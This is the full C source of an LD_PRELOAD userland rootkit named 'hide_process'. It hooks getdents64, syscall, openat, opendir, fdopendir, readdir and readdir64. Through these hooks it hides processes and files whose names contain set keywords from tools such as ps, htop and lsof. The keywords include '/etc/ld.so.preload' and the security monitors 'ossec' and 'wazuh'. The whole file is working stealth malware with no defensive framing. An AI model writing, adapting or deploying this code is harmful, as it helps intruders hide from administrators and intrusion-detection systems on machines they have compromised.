#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>

// Conditional debug macros
#if DEBUG_MODE
    #define DEBUG_PRINT(...) fprintf(stderr, __VA_ARGS__); fflush(stderr)
#else
    #define DEBUG_PRINT(...) do {} while(0)
#endif

// Magic keywords to hide - processes/files containing ANY of these will be hidden
static const char *MAGIC_KEYWORDS[] = {
    "apoptosis",
    "ossec",
    "mhc_downreg",
    "wazuh",
    "caspase",
    "/etc/ld.so.preload",
    NULL  // Sentinel to mark end of array
};

#define MAX_CMDLINE 4096

// Constructor - runs when library is loaded
__attribute__((constructor))
static void init(void) {
#if DEBUG_MODE
    fprintf(stderr, "\n");
    fprintf(stderr, "==============================================\n");
    fprintf(stderr, "[hide_process] Library loaded! PID=%d\n", getpid());
    fprintf(stderr, "[hide_process] Magic keywords:\n");
    for (int i = 0; MAGIC_KEYWORDS[i] != NULL; i++) {
        fprintf(stderr, "[hide_process]   - '%s'\n", MAGIC_KEYWORDS[i]);
    }
    fprintf(stderr, "==============================================\n");
    fprintf(stderr, "\n");
    fflush(stderr);
#endif
}

// Structure for getdents64 - must match kernel structure
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

// Pointer to the original getdents64 function
static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count) = NULL;

// Pointer to original syscall
static long (*original_syscall)(long number, ...) = NULL;

// Pointer to original readdir
static struct dirent *(*original_readdir)(DIR *dirp) = NULL;

// Pointer to original readdir64
static struct dirent64 *(*original_readdir64)(DIR *dirp) = NULL;

// Track which DIR* we're filtering
#define MAX_TRACKED_DIRS 64
static struct {
    DIR *dir;
    char path[256];
} tracked_dirs[MAX_TRACKED_DIRS];
static int tracked_dir_count = 0;

// Check if a string contains any of the magic keywords
static int contains_magic_keyword(const char *str) {
    if (!str) {
        return 0;
    }

    for (int i = 0; MAGIC_KEYWORDS[i] != NULL; i++) {
        if (strstr(str, MAGIC_KEYWORDS[i]) != NULL) {
            DEBUG_PRINT("[hide_process] *** String '%s' contains magic keyword '%s' ***\n",
                    str, MAGIC_KEYWORDS[i]);
            return 1;
        }
    }
    return 0;
}

// Check if a PID's cmdline matches our target process
static int should_hide_pid(const char *pid_str) {
    char path[256];
    char cmdline[MAX_CMDLINE];
    int fd;
    ssize_t bytes_read;

    // Build path to cmdline file
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);

    DEBUG_PRINT("[hide_process] Checking PID %s: opening %s\n", pid_str, path);

    // Try to open and read cmdline
    fd = open(path, O_RDONLY);
    if (fd == -1) {
        // Process may have exited or we don't have permission
        DEBUG_PRINT("[hide_process] Failed to open %s: %s\n", path, strerror(errno));
        return 0;
    }

    bytes_read = read(fd, cmdline, sizeof(cmdline) - 1);
    close(fd);

    if (bytes_read <= 0) {
        DEBUG_PRINT("[hide_process] Failed to read cmdline for PID %s (bytes_read=%zd)\n", pid_str, bytes_read);
        return 0;
    }

    // Null terminate
    cmdline[bytes_read] = '\0';

#if DEBUG_MODE
    // Replace null bytes with spaces for readable output
    char cmdline_display[MAX_CMDLINE];
    memcpy(cmdline_display, cmdline, bytes_read);
    for (ssize_t i = 0; i < bytes_read - 1; i++) {
        if (cmdline_display[i] == '\0') {
            cmdline_display[i] = ' ';
        }
    }
    cmdline_display[bytes_read] = '\0';

    DEBUG_PRINT("[hide_process] PID %s cmdline: '%s'\n", pid_str, cmdline_display);
#endif

    // cmdline has null-separated arguments, check if any magic keyword appears
    if (contains_magic_keyword(cmdline)) {
        DEBUG_PRINT("[hide_process] *** MATCH! Hiding PID %s ***\n", pid_str);
        return 1;
    }

    DEBUG_PRINT("[hide_process] PID %s does not match any magic keywords\n", pid_str);
    return 0;
}

// Check if a string is all digits (a PID)
static int is_numeric(const char *str) {
    if (!str || !*str) {
        return 0;
    }

    while (*str) {
        if (*str < '0' || *str > '9') {
            return 0;
        }
        str++;
    }
    return 1;
}

// Our hooked getdents64 function
ssize_t getdents64(int fd, void *dirp, size_t count) {
    ssize_t nread;
    long bpos;
    struct linux_dirent64 *d;
    char proc_path[256];
    char fd_path[256];
    ssize_t len;

    DEBUG_PRINT("[hide_process] getdents64 called: fd=%d, count=%zu\n", fd, count);

    // Load the original function if we haven't already
    if (!original_getdents64) {
        DEBUG_PRINT("[hide_process] Loading original getdents64...\n");
        original_getdents64 = dlsym(RTLD_NEXT, "getdents64");
        if (!original_getdents64) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original getdents64: %s\n", dlerror());
            errno = ENOSYS;
            return -1;
        }
        DEBUG_PRINT("[hide_process] Successfully loaded original getdents64\n");
    }

    // Call the original getdents64
    nread = original_getdents64(fd, dirp, count);

    DEBUG_PRINT("[hide_process] original getdents64 returned: %zd bytes\n", nread);

    if (nread <= 0) {
        if (nread == 0) {
            DEBUG_PRINT("[hide_process] End of directory reached\n");
        } else {
            DEBUG_PRINT("[hide_process] Error from original getdents64: %s\n", strerror(errno));
        }
        return nread;
    }

    // Check if this fd is reading from /proc
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    len = readlink(fd_path, proc_path, sizeof(proc_path) - 1);

    if (len <= 0) {
        // Can't determine what directory this is, pass through unchanged
        DEBUG_PRINT("[hide_process] Can't determine directory path for fd %d: %s\n", fd, strerror(errno));
        return nread;
    }

    proc_path[len] = '\0';

    DEBUG_PRINT("[hide_process] fd %d points to: %s\n", fd, proc_path);

    // Only filter if we're reading /proc
    if (strcmp(proc_path, "/proc") != 0) {
        DEBUG_PRINT("[hide_process] Not /proc, passing through unchanged\n");
        return nread;
    }

    DEBUG_PRINT("[hide_process] *** Reading /proc - filtering entries ***\n");

#if DEBUG_MODE
    // Count entries before filtering
    int entry_count = 0;
    long temp_bpos = 0;
    while (temp_bpos < nread) {
        d = (struct linux_dirent64 *)((char *)dirp + temp_bpos);
        entry_count++;
        temp_bpos += d->d_reclen;
    }
    DEBUG_PRINT("[hide_process] Found %d directory entries\n", entry_count);
#endif

    // Filter the directory entries
    bpos = 0;
    int filtered_count = 0;
    while (bpos < nread) {
        d = (struct linux_dirent64 *)((char *)dirp + bpos);

        DEBUG_PRINT("[hide_process] Entry: '%s' (type=%d, reclen=%d)\n",
                d->d_name, d->d_type, d->d_reclen);

        // Check if this is a numeric entry (PID) and should be hidden
        if (is_numeric(d->d_name)) {
            DEBUG_PRINT("[hide_process] '%s' is numeric (PID), checking if should hide...\n", d->d_name);

            if (should_hide_pid(d->d_name)) {
                // Remove this entry by shifting remaining entries forward
                long entry_size = d->d_reclen;
                long remaining = nread - (bpos + entry_size);

                DEBUG_PRINT("[hide_process] *** Filtering out PID %s (entry_size=%ld, remaining=%ld) ***\n",
                        d->d_name, entry_size, remaining);

                if (remaining > 0) {
                    memmove((char *)dirp + bpos,
                           (char *)dirp + bpos + entry_size,
                           remaining);
                }

                nread -= entry_size;
                filtered_count++;
                // Don't increment bpos - check the same position again
            } else {
                DEBUG_PRINT("[hide_process] Keeping PID %s\n", d->d_name);
                bpos += d->d_reclen;
            }
        } else {
            DEBUG_PRINT("[hide_process] '%s' is not numeric, keeping\n", d->d_name);
            bpos += d->d_reclen;
        }
    }

    DEBUG_PRINT("[hide_process] Filtering complete: removed %d entries, returning %zd bytes\n",
            filtered_count, nread);

    return nread;
}

// Intercept syscall() to catch direct getdents64 calls
long syscall(long number, ...) {
    va_list args;
    long result;

    DEBUG_PRINT("[hide_process] syscall called: number=%ld\n", number);

    // Load original syscall if needed
    if (!original_syscall) {
        DEBUG_PRINT("[hide_process] Loading original syscall...\n");
        original_syscall = dlsym(RTLD_NEXT, "syscall");
        if (!original_syscall) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original syscall: %s\n", dlerror());
            errno = ENOSYS;
            return -1;
        }
    }

    if (number == SYS_getdents64) {  // SYS_getdents64
        DEBUG_PRINT("[hide_process] Detected SYS_getdents64 via syscall()!\n");

        va_start(args, number);
        int fd = va_arg(args, int);
        void *dirp = va_arg(args, void *);
        size_t count = va_arg(args, size_t);
        va_end(args);

        // Call our hooked getdents64
        return getdents64(fd, dirp, count);
    }

    // For other syscalls, pass through
    va_start(args, number);
    // This is tricky - we need to handle variable args
    // For simplicity, assume max 6 args (typical for syscalls)
    long arg1 = va_arg(args, long);
    long arg2 = va_arg(args, long);
    long arg3 = va_arg(args, long);
    long arg4 = va_arg(args, long);
    long arg5 = va_arg(args, long);
    long arg6 = va_arg(args, long);
    va_end(args);

    result = original_syscall(number, arg1, arg2, arg3, arg4, arg5, arg6);
    return result;
}

// Hook openat to block access to hidden PID paths (used by htop and other tools)
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*original_openat)(int, const char *, int, ...) = NULL;
    mode_t mode = 0;

    DEBUG_PRINT("[hide_process] openat called: dirfd=%d, pathname=%s, flags=%d\n", dirfd, pathname, flags);

    if (!original_openat) {
        DEBUG_PRINT("[hide_process] Loading original openat...\n");
        original_openat = dlsym(RTLD_NEXT, "openat");
        if (!original_openat) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original openat: %s\n", dlerror());
            errno = ENOSYS;
            return -1;
        }
    }

    // Handle variadic arguments for mode (used with O_CREAT)
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    // Check if this is a /proc/<pid>/* path
    if (strncmp(pathname, "/proc/", 6) == 0) {
        const char *pid_start = pathname + 6;  // Skip "/proc/"

        DEBUG_PRINT("[hide_process] openat: Path starts with /proc/, extracting PID from: %s\n", pathname);

        // Extract PID portion (everything up to next '/' or end of string)
        char pid_str[32];
        int i = 0;
        while (pid_start[i] && pid_start[i] != '/' && i < sizeof(pid_str) - 1) {
            pid_str[i] = pid_start[i];
            i++;
        }
        pid_str[i] = '\0';

        DEBUG_PRINT("[hide_process] openat: Extracted string: '%s'\n", pid_str);

        // Check if this is a numeric PID and should be hidden
        if (is_numeric(pid_str)) {
            DEBUG_PRINT("[hide_process] openat: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);

            if (should_hide_pid(pid_str)) {
                DEBUG_PRINT("[hide_process] *** BLOCKING openat for hidden PID %s (path: %s) ***\n",
                        pid_str, pathname);
                DEBUG_PRINT("[hide_process] *** Returning -1 with errno=ENOENT ***\n");
                errno = ENOENT;  // "No such file or directory"
                return -1;
            } else {
                DEBUG_PRINT("[hide_process] openat: PID %s is NOT hidden, allowing access to %s\n", pid_str, pathname);
            }
        } else {
            DEBUG_PRINT("[hide_process] openat: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, pathname);
        }
    } else {
        DEBUG_PRINT("[hide_process] openat: Path does NOT start with /proc/, no filtering needed\n");
    }

    // Call original openat
    if (flags & O_CREAT) {
        return original_openat(dirfd, pathname, flags, mode);
    } else {
        return original_openat(dirfd, pathname, flags);
    }
}

// Hook fdopendir to prevent converting fd to DIR* for hidden PIDs
DIR *fdopendir(int fd) {
    static DIR *(*original_fdopendir)(int) = NULL;
    char fd_path[256];
    char real_path[256];
    ssize_t len;

    DEBUG_PRINT("[hide_process] fdopendir called: fd=%d\n", fd);

    if (!original_fdopendir) {
        DEBUG_PRINT("[hide_process] Loading original fdopendir...\n");
        original_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
        if (!original_fdopendir) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original fdopendir: %s\n", dlerror());
            errno = ENOSYS;
            return NULL;
        }
    }

    // Try to resolve what path this fd points to
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    len = readlink(fd_path, real_path, sizeof(real_path) - 1);

    if (len > 0) {
        real_path[len] = '\0';
        DEBUG_PRINT("[hide_process] fdopendir: fd %d points to: %s\n", fd, real_path);

        // Check if this is a /proc/<pid> path
        if (strncmp(real_path, "/proc/", 6) == 0) {
            const char *pid_start = real_path + 6;  // Skip "/proc/"

            DEBUG_PRINT("[hide_process] fdopendir: Path starts with /proc/, extracting PID from: %s\n", real_path);

            // Extract PID portion (everything up to next '/' or end of string)
            char pid_str[32];
            int i = 0;
            while (pid_start[i] && pid_start[i] != '/' && i < sizeof(pid_str) - 1) {
                pid_str[i] = pid_start[i];
                i++;
            }
            pid_str[i] = '\0';

            DEBUG_PRINT("[hide_process] fdopendir: Extracted string: '%s'\n", pid_str);

            // Check if this is a numeric PID and should be hidden
            if (is_numeric(pid_str)) {
                DEBUG_PRINT("[hide_process] fdopendir: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);

                if (should_hide_pid(pid_str)) {
                    DEBUG_PRINT("[hide_process] *** BLOCKING fdopendir for hidden PID %s (path: %s) ***\n",
                            pid_str, real_path);
                    DEBUG_PRINT("[hide_process] *** Returning NULL with errno=ENOENT ***\n");
                    errno = ENOENT;  // "No such file or directory"
                    return NULL;
                } else {
                    DEBUG_PRINT("[hide_process] fdopendir: PID %s is NOT hidden, allowing access to %s\n", pid_str, real_path);
                }
            } else {
                DEBUG_PRINT("[hide_process] fdopendir: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, real_path);
            }
        }
    } else {
        DEBUG_PRINT("[hide_process] fdopendir: Could not resolve fd %d to path: %s\n", fd, strerror(errno));
    }

    // Call original fdopendir
    DIR *result = original_fdopendir(fd);

    // Track the directory if successful
    if (result && len > 0) {
        DEBUG_PRINT("[hide_process] fdopendir: Tracking DIR handle: %p for path: %s\n", result, real_path);

        if (tracked_dir_count < MAX_TRACKED_DIRS) {
            tracked_dirs[tracked_dir_count].dir = result;
            strncpy(tracked_dirs[tracked_dir_count].path, real_path, sizeof(tracked_dirs[0].path) - 1);
            tracked_dir_count++;
        } else {
            DEBUG_PRINT("[hide_process] WARNING: Tracking array full! Cannot track more directories.\n");
        }
    }

    return result;
}

// Hook opendir to track when directories are opened AND block access to hidden PIDs
DIR *opendir(const char *name) {
    static DIR *(*original_opendir)(const char *) = NULL;

    DEBUG_PRINT("[hide_process] opendir called: %s\n", name);

    if (!original_opendir) {
        original_opendir = dlsym(RTLD_NEXT, "opendir");
        if (!original_opendir) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original opendir\n");
            return NULL;
        }
    }

    // Check if this is a /proc/<pid>/* path
    if (strncmp(name, "/proc/", 6) == 0) {
        const char *pid_start = name + 6;  // Skip "/proc/"

        DEBUG_PRINT("[hide_process] opendir: Path starts with /proc/, extracting PID from: %s\n", name);

        // Extract PID portion (everything up to next '/' or end of string)
        char pid_str[32];
        int i = 0;
        while (pid_start[i] && pid_start[i] != '/' && i < sizeof(pid_str) - 1) {
            pid_str[i] = pid_start[i];
            i++;
        }
        pid_str[i] = '\0';

        DEBUG_PRINT("[hide_process] opendir: Extracted string: '%s'\n", pid_str);

        // Check if this is a numeric PID and should be hidden
        if (is_numeric(pid_str)) {
            DEBUG_PRINT("[hide_process] opendir: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);

            if (should_hide_pid(pid_str)) {
                DEBUG_PRINT("[hide_process] *** BLOCKING opendir for hidden PID %s (path: %s) ***\n",
                        pid_str, name);
                DEBUG_PRINT("[hide_process] *** Returning NULL with errno=ENOENT ***\n");
                errno = ENOENT;  // "No such file or directory"
                return NULL;
            } else {
                DEBUG_PRINT("[hide_process] opendir: PID %s is NOT hidden, allowing access to %s\n", pid_str, name);
            }
        } else {
            DEBUG_PRINT("[hide_process] opendir: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, name);
        }
    } else {
        DEBUG_PRINT("[hide_process] opendir: Path does NOT start with /proc/, no filtering needed\n");
    }

    DIR *result = original_opendir(name);

    // Track ALL directories now
    if (result) {
        DEBUG_PRINT("[hide_process] Tracking DIR handle: %p for path: %s\n", result, name);

        if (tracked_dir_count < MAX_TRACKED_DIRS) {
            tracked_dirs[tracked_dir_count].dir = result;
            strncpy(tracked_dirs[tracked_dir_count].path, name, sizeof(tracked_dirs[0].path) - 1);
            tracked_dir_count++;
        } else {
            DEBUG_PRINT("[hide_process] WARNING: Tracking array full! Cannot track more directories.\n");
        }
    }

    return result;
}

// Hook closedir to remove tracked directories when closed
int closedir(DIR *dirp) {
    static int (*original_closedir)(DIR *) = NULL;

    DEBUG_PRINT("[hide_process] closedir called: dirp=%p\n", dirp);

    if (!original_closedir) {
        original_closedir = dlsym(RTLD_NEXT, "closedir");
        if (!original_closedir) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original closedir\n");
            errno = ENOSYS;
            return -1;
        }
    }

    // Remove from tracking array to prevent stale entries
    for (int i = 0; i < tracked_dir_count; i++) {
        if (tracked_dirs[i].dir == dirp) {
            DEBUG_PRINT("[hide_process] Removing tracked dir: %s (handle %p)\n",
                    tracked_dirs[i].path, dirp);

            // Shift remaining entries down
            for (int j = i; j < tracked_dir_count - 1; j++) {
                tracked_dirs[j] = tracked_dirs[j + 1];
            }
            tracked_dir_count--;
            break;
        }
    }

    return original_closedir(dirp);
}

// Hook readdir to filter entries
struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;

    if (!original_readdir) {
        DEBUG_PRINT("[hide_process] Loading original readdir...\n");
        original_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!original_readdir) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original readdir\n");
            return NULL;
        }
    }

    // Find which directory this is
    int is_proc = 0;
    char dir_path[256] = "";
    for (int i = 0; i < tracked_dir_count; i++) {
        if (tracked_dirs[i].dir == dirp) {
            strncpy(dir_path, tracked_dirs[i].path, sizeof(dir_path) - 1);
            if (strcmp(dir_path, "/proc") == 0) {
                is_proc = 1;
            }
            break;
        }
    }

    // Keep reading until we find an entry we shouldn't hide
    while ((entry = original_readdir(dirp)) != NULL) {
        // For /proc, check if it's a PID that should be hidden
        if (is_proc && is_numeric(entry->d_name)) {
            DEBUG_PRINT("[hide_process] readdir found PID: %s\n", entry->d_name);

            if (should_hide_pid(entry->d_name)) {
                DEBUG_PRINT("[hide_process] Skipping hidden PID: %s\n", entry->d_name);
                continue;  // Skip this entry, read next one
            }
        }

        // For ANY directory, check if filename contains any magic keyword
        if (contains_magic_keyword(entry->d_name)) {
            DEBUG_PRINT("[hide_process] *** Hiding file '%s' in directory '%s' ***\n",
                    entry->d_name, dir_path);
            continue;  // Skip this entry, read next one
        }

        // Return this entry
        return entry;
    }

    // No more entries
    return NULL;
}

// Hook readdir64 to filter entries (critical for lsof and other tools)
struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *entry;

    if (!original_readdir64) {
        DEBUG_PRINT("[hide_process] Loading original readdir64...\n");
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (!original_readdir64) {
            DEBUG_PRINT("[hide_process] FATAL: Failed to load original readdir64\n");
            return NULL;
        }
    }

    // Find which directory this is
    int is_proc = 0;
    char dir_path[256] = "";
    for (int i = 0; i < tracked_dir_count; i++) {
        if (tracked_dirs[i].dir == dirp) {
            strncpy(dir_path, tracked_dirs[i].path, sizeof(dir_path) - 1);
            if (strcmp(dir_path, "/proc") == 0) {
                is_proc = 1;
            }
            break;
        }
    }

    // Keep reading until we find an entry we shouldn't hide
    while ((entry = original_readdir64(dirp)) != NULL) {
        // For /proc, check if it's a PID that should be hidden
        if (is_proc && is_numeric(entry->d_name)) {
            DEBUG_PRINT("[hide_process] readdir64 found PID: %s\n", entry->d_name);

            if (should_hide_pid(entry->d_name)) {
                DEBUG_PRINT("[hide_process] Skipping hidden PID: %s\n", entry->d_name);
                continue;  // Skip this entry, read next one
            }
        }

        // For ANY directory, check if filename contains any magic keyword
        if (contains_magic_keyword(entry->d_name)) {
            DEBUG_PRINT("[hide_process] *** Hiding file '%s' in directory '%s' ***\n",
                    entry->d_name, dir_path);
            continue;  // Skip this entry, read next one
        }

        // Return this entry
        return entry;
    }

    // No more entries
    return NULL;
}
